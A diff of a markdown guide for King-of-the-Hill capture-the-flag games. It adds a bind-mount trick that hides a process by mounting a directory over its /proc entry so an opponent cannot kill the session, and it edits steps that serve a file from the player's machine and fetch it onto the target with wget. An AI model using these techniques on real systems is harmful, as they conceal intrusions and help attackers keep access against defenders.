@@ -11,6 +11,11 @@ Repository Creator
 
 ```
 mount -o bind /tmp /proc/PID
+
+or
+
+mount --bind /tmp/hidden /proc/$pid
+
 ```
 
 there where it is written PID, you will put your PID there, for example you can use ps aux to get the PID of your PTS, and using this command you will be invisible, and your opponent will not be able to kill your session
@@ -125,7 +130,7 @@ and so you can upload that binary on the koth machine, or even upload chattr.c o
 
 #### Sending Nyancat to machine
 
-> python -m SimpleHTTPServer 80 # on your local machine
+> python -m SimpleHTTPServer <Port> # on your local machine
 
 > wget http://yourip/nyancat # on the KOTH machine
 
